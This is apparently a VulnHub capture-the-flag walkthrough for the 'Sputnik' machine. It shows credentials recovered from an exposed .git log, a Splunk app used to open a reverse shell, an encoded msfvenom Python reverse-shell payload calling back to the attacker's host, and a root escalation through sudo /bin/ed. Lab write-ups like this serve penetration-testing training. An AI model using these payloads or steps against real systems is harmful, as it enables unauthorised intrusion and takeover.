Sputnik

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] .git Clonning
[+] .git log 
[+] Splunk Exploitation
[+] python Reverse Shell
[+] Privilge Escalation abusing SUDO rights - /bin/ed
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nmap Scanning

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.108
Host is up (0.00041s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
8089/tcp  open  unknown
8191/tcp  open  limnerpressure
55555/tcp open  unknown
61337/tcp open  unknown
MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap Service Scanning

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nmap -sTV -O -A 192.168.56.108 | tee OVAT_sputnik
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-02 10:57 EDT
Nmap scan report for 192.168.56.108
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE  VERSION
8089/tcp  open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-03-29T11:03:21
|_Not valid after:  2022-03-28T11:03:21
55555/tcp open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-git: 
|   192.168.56.108:55555/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Flappy Bird Game
MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms 192.168.56.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.38 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going into the /.git directory we found

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.108:55555/.git/logs/HEAD
0000000000000000000000000000000000000000 21b4eb398bdae0799afbbb528468b5c6f580b975 root <root@sputnik.(none)> 1553864873 +0000	clone: from https://github.com/ameerpornillos/flappy.git

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Clonning repository

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/Public$ git clone https://github.com/ameerpornillos/flappy.git
Cloning into 'flappy'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 65 (delta 11), reused 0 (delta 0), pack-reused 33
Unpacking objects: 100% (65/65), done.
root@setrus:~/Public$ ls
flappy
root@setrus:~/Public$ cd flappy/
root@setrus:~/Public/flappy$ git log
commit 884adf394909a8f5989a163bb666003ea870f582 (HEAD -> master, origin/master, origin/HEAD)
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:22:06 2019 +0800

    Update new file

commit d4a672434b93fd156dd61e2b756048501fe0bbc6
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:21:09 2019 +0800

    Delete new file

commit 6aa723152729e58f2492acf0386b37571aebfaa2
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:20:55 2019 +0800

    Create new file

commit 67f4815c799a81612c8c33364b3b8d3685d9b6d9
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:19:43 2019 +0800

    Update new file

commit 72bd06137d23a3846ba0d64bcf72c445c100b898
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:19:14 2019 +0800

    Update new file

commit fdd806897314ed67442fd12c4fc0ccc678dc9857
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:18:45 2019 +0800

    Delete new file

commit 5c5d8adcf57267bc0a936a7db21ddb90fcbcd9ca
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:18:11 2019 +0800

    Commit new file

commit 1fd4401839b9a8b72e631213f8f45a575c9528ea
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:10:28 2019 +0800

    Update file

commit 9a2c462ade52db713c8c8e3c9b69a9ac1566384d
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:09:49 2019 +0800

    Update file

commit 0b14924cecebaf24dbcc9895bb266f41efd991d6
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:08:50 2019 +0800

    Delete new file

commit 998ed1a2e8cca9f3574e2224583bdded18c8590d
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:08:35 2019 +0800

    Delete new file

commit 36a5cccf27168e1db2d0ef4532eda15e8ed804af
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:08:05 2019 +0800

    Commit new file

commit 16962bfb95b7e89dff326f33f07e5bd5d95c5a7c
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:07:24 2019 +0800

    Commit new file

commit 21b4eb398bdae0799afbbb528468b5c6f580b975
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 21:02:22 2019 +0800

    Update index.html

commit 2b5f6a83f073daba038f700ead56834c3795f3c2
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 20:30:41 2019 +0800


    Update sprite.js

commit 0dafaf31ba3bc76844127b417191be59d320d705
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 20:28:58 2019 +0800

    Delete new file

commit b38d4f0e65b0bc7044792da436da5d763dc1acd1
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 20:28:15 2019 +0800

    Update new file

commit 07fda135aae22fa7869b3de9e450ff7cacfbc717
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 20:27:01 2019 +0800

    Commit new file

commit 2541266769d9ea409ad2e84fce3dd0267ed89a04
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 20:05:22 2019 +0800


root@setrus:~/Public/flappy$ git ls-tree 07fda135aae22fa7869b3de9e450ff7cacfbc717
100644 blob bdb0cabc87cf50106df6e15097dff816c8c3eb34	.gitattributes
100644 blob cd2946ad76b4402e5b3cab9243a9281aad228670	.gitignore
100644 blob 8f260dadbe40cdc656eb43c0c24401bdd4255bd0	README.md
100644 blob b7c6a79fd534ed19ab1708ac7a754ca1db28b951	index.html
100644 blob f4385198ce1cab56e0b2a1c55e8863040045b085	secret
100644 blob df45033222b87c64965dce38263e6d5948fb5ec1	sheet.png
100644 blob ad295422122860df7d9a4ef0c74de1e6deb67050	sprite.js
root@setrus:~/Public/flappy$ git show f4385198ce1cab56e0b2a1c55e8863040045b085
sputnik:ameer_says_thank_you_and_good_job
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going to Splunk on http://192.168.56.108:61137 and loggin in with sputnik:ameer_says_thank_you_and_good_job
A version of splunk enterprise in installed

Exploitation of splunk

Get https://github.com/TBGSecurity/splunk_shells 

Go to Apps >  Manage Apps
Install App from file. 
Upload the zip file and restart Splunk.
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Sputnik/sput1.png)

Select  
Weaponize Splunk for Pentesting and Red Teaming                                                        

Set Permissions :  All Apps
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Sputnik/sput2.png)
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Sputnik/sput3.png)


Start listener on Kali machine : nc -nvlp 1234
Running exploit
Going to search , we enter :     | revshell stf 192.168.56.102 1234
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Sputnik/sput4.png)
We receive a connection back from the splunk server:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.108] 54196

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Creating a payload in python because we are unable to execute commands:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# msfvenom -p cmd/unix/reverse_python lhost=192.168.56.102 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 497 bytes
python -c "exec('aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgICAgOyAgICBob3N0PSIxOTIuMTY4LjU2LjEwMiIgICAgOyAgICBwb3J0PTQ0NDQgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsICAgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QsICAgICAgIHBvcnQpKSAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAgMCkgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgIDEpICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgICAyKSAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After getting the reverse shell ( stardard reverse shell) we are pasting the payload into the terminal, and this will give us another shell on port 4444.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.108] 54196
python -c "exec('aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgICAgOyAgICBob3N0PSIxOTIuMTY4LjU2LjEwMiIgICAgOyAgICBwb3J0PTQ0NDQgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsICAgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QsICAgICAgIHBvcnQpKSAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAgMCkgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgIDEpICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgICAyKSAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Reverse shell on port 4444

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.108] 57500
id
uid=1001(splunk) gid=1001(splunk) groups=1001(splunk)
whoami
splunk

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting Root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.108] 57500
id
uid=1001(splunk) gid=1001(splunk) groups=1001(splunk)
whoami
splunk
python -c 'import pty;pty.spawn("/bin/bash");'
splunk@sputnik:/$ 
splunk@sputnik:/$ sudo -l
sudo -l
[sudo] password for splunk: plunk
[sudo] password for splunk: ameer_says_thank_you_and_good_job

Matching Defaults entries for splunk on sputnik:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User splunk may run the following commands on sputnik:
    (root) /bin/ed

splunk@sputnik:/$ id
id
uid=1001(splunk) gid=1001(splunk) groups=1001(splunk)
splunk@sputnik:/$ sudo ed
sudo ed
!/bin/sh
!/bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting the flag

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# cat flag.txt	
cat flag.txt
 _________________________________________
/ Congratulations!                        \
|                                         |
| You did it!                             |
|                                         |
| Thank you for trying out this challenge |
| and hope that you learn a thing or two. |
|                                         |
| Check the flag below.                   |
|                                         |
| flag_is{w1th_gr34t_p0w3r_c0m35_w1th_gr3 |
| 4t_r3sp0ns1b1l1ty}                      |
|                                         |
| Hope you enjoy solving this challenge.  |
| :D                                      |
|                                         |
\ - ameer (from hackstreetboys)           /
 -----------------------------------------
      \                    / \  //\
       \    |\___/|      /   \//  \\
            /0  0  \__  /    //  | \ \    
           /     /  \/_/    //   |  \  \  
           @_^_@'/   \/_   //    |   \   \ 
           //_^_/     \/_ //     |    \    \
        ( //) |        \///      |     \     \
      ( / /) _|_ /   )  //       |      \     _\
    ( // /) '/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.
  (( / / )) ,-{        _      `-.|.-~-.           .~         `.
 (( // / ))  '/\      /                 ~-. _ .-~      .-~^-.  \
 (( /// ))      `.   {            }                   /      \  \
  (( / ))     .----~-.\        \-'                 .~         \  `. \^-.
             ///.----..>        \             _ -~             `.  ^-`  ^-_
               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~
                                                                  /.-~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



